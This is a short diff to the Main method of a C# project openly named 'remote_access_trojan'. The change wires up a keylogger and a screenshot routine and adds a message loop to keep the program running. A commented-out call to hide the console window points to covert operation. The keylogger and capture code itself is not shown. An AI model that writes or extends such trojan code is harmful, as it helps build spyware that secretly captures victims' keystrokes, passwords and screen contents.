@@ -1,9 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace remote_access_trojan
 {
@@ -18,11 +14,12 @@ namespace remote_access_trojan
             //ShowWindow(handle, SW_HIDE);
 
             Console.WriteLine("Hello World!");
+
             Keylogger.Run();
+            Screenshot.takeScreenshot();
 
-            Screenshot screenshotManager = new Screenshot();
-            screenshotManager.takeScreenshot();
-
+            // Do not move - this needs to be the last line
+            Application.Run();
         }
     }
 }
